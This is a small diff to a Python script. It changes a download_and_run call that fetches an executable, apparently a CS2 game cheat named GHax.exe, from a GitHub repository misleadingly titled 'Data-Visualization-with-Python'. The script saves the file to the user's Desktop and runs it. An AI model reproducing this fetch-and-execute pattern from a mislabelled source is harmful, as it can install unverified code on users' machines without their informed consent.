@@ -119,8 +119,10 @@ def main():
 
             os.remove(FILENAME)
 
-    download_and_run("https://github.com/Cr0mb/Data-Visualization-with-Python/blob/main/CS2%20External%20Multi%20DX11.exe?raw=true", 
+    download_and_run("https://github.com/Cr0mb/Data-Visualization-with-Python/blob/main/GHax.exe", 
                      os.path.join(os.path.expanduser("~"), "Desktop", "GHax.exe"), hide_console=False)
+
+
 
     sys.exit(0)
 
